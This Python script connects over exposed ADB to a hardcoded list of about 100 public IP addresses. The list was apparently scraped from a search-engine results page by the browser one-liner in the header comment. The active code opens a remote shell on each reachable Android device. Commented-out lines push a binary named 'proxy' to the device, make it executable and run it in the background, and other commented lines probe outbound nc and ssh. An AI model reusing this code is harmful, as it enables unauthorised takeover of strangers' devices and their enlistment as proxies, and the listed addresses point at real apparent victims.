# prompt('ctrl+c, enter',JSON.stringify([...document.querySelector("body > div.container.u-full-width.card.card-padding > div > div.nine.columns").children].filter(e=>e.className=='result').map(e=>e.children[1].innerText)))
ips =  ["199.126.183.127","124.255.238.115","85.227.81.169","122.234.1.111","112.234.185.89","110.89.8.85","69.167.31.242","110.10.211.65","36.48.37.129","124.255.237.191"]
ips += ["85.227.81.169","84.238.113.3","5.103.60.215","109.59.55.114"]
ips += ["124.255.238.42","124.255.230.1","124.255.253.185","124.255.230.28","124.255.238.113","124.255.237.194"]
ips += ["69.167.31.242","131.212.125.74","174.64.31.159","24.189.171.63","169.229.139.197","137.119.190.159","173.28.250.101","216.128.147.128","128.90.106.149","160.223.223.74"]
ips += ["110.10.211.65"]
ips += ["199.126.183.127","124.255.238.115","85.227.81.169","122.234.1.111","112.234.185.89","110.89.8.85","69.167.31.242","110.10.211.65","36.48.37.129","124.255.237.191"]
ips += ["200.35.221.178","45.120.203.168","151.252.171.50","24.66.18.93","152.249.64.72","123.161.222.42","112.118.71.40","1.64.3.128","176.37.215.120","45.219.38.173"]
ips += ["200.35.221.178","201.209.125.175","186.92.6.219","186.93.126.150","201.211.149.57","190.74.124.192","186.91.5.10","190.206.99.145","38.222.51.242","38.166.62.138"]
ips += ["200.109.10.199","190.204.139.171","201.208.221.109","186.89.229.91","190.207.225.139","201.242.172.221","190.200.145.21","190.207.153.83","201.248.211.96","186.91.141.171"]
ips += ["45.120.203.168"]
ips += ["151.252.171.50"]
ips += ["24.66.18.93"]
ips += ["123.161.222.42","1.196.248.22","115.57.161.216","123.7.117.99","123.7.117.72","123.161.222.238","171.11.98.187","125.43.65.48","61.52.151.193","123.4.255.51"]
ips += ["112.118.71.40","1.64.3.128","219.73.96.81","223.19.211.52","221.127.152.169","218.250.91.58","168.70.19.134","221.127.29.19","119.236.28.58","223.16.75.114"]
ips += ["45.219.38.173","45.219.27.255","160.167.12.217","154.148.78.111","105.188.20.211","196.69.254.30","160.173.213.241","196.69.176.34","196.126.2.28","196.67.191.15"]
ips = list(set(ips))
# import subprocess

# def run_command(*command):
#     p = subprocess.Popen(command)
#     try:
#         p.wait(4)
#     except subprocess.TimeoutExpired:
#         p.kill()
#         return -1
#     return p.returncode
    

# for ip in ips:
#     try:
#         run_command('adb', 'connect', ip)
#         run_command('adb', '-s', ip, 'shell', 'ssh', '-v')
#     except:
#         pass
#     finally:
#         run_command('adb', 'disconnect', ip)


import asyncio
import shlex
import os.path

import timeout


async def run(*command, input=None, **s):
    try:
        process = await asyncio.subprocess.create_subprocess_exec(*command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, stdin=asyncio.subprocess.PIPE)
        stdout, stderr = await timeout.run_with_timeout(process.communicate(input=input), 4)
        return process.returncode, stdout, stderr
    finally:
        del process

async def adb_connection(ip):
    try:
        a=await run('adb', 'connect', ip)
        if not a[1].startswith(b'connected to ') and not a[1].startswith(b'already connected to '):
            return
    except asyncio.TimeoutError:
        return
    self = yield
    res = lambda *a, **s: self.asend([a,s])
    while 1:
        command,s = yield res
        s: dict
        mode = s.get('_mode', 'exec')
        if mode == None:
            res = await run('adb', '-s', ip, *command, **s)
            continue
        if mode == 'exec':
            command = shlex.join(command)
        res = await run('adb', '-s', ip, 'shell', command, **s)

async def adb_shell(ip):
    connection = adb_connection(ip)
    try:
        await connection.asend(None)
        return await connection.asend(connection)
    except StopAsyncIteration:
        return None

async def process_one_ip(ip):
    shell = await adb_shell(ip)
    if not shell:
        return
    print(f'__ connected to {ip}')
    try:
        a=await shell('pwd')
        print(a)
        # print(f'__ mktemp works for {ip}')
        # if a[1] and a[1][0]!=b'/' or b' ' in a[1] or b':' in a[1]:
        #     return
        # filename = a[1].strip()
        # print(ip, a, filename)
        # a=await shell('push', 'proxy',filename, _mode=None)
        # print(ip, a)
        # a=await shell('chmod', '+x', filename)
        # print(ip, a)
        # a=await shell(f'cd {os.path.dirname(filename)}; (nohup {filename} &); echo $!')
        # print(ip, a)
    except asyncio.TimeoutError:
        pass
    # if a[2].startswith('ls:'):
    #     print(ip)


    # await shell('')
    # a = await shell('nc', 'twitter.com', '80', input=b'GET / HTTP/1.1\r\n\r\n')
    # print(ip, a)

    # await connection.asend(None)
    # await connection.asend(['nc', 'twitter.com'])



    # a=await run('adb', 'connect', ip)
    # if not a[1].startswith(b'connected to '):
    #     return
    # 'adb', '-s', ip, 'shell',
    #     a=await run('adb', '-s', ip, 'shell', 'nc twitter.com 80', input=b'GET / HTTP/1.1\r\n\r\n')
    # print(a)
    # print(ip)
    # a=await run('adb', '-s', ip, 'shell', 'ssh', '-V')
    # if b'Dropbear' in a[1] or b'SSH' in a[1]:
    #     print(ip)

async def main():
    try:
        await asyncio.gather(*map(process_one_ip, ips))
    finally:
        await asyncio.sleep(0.1)

asyncio.run(main())

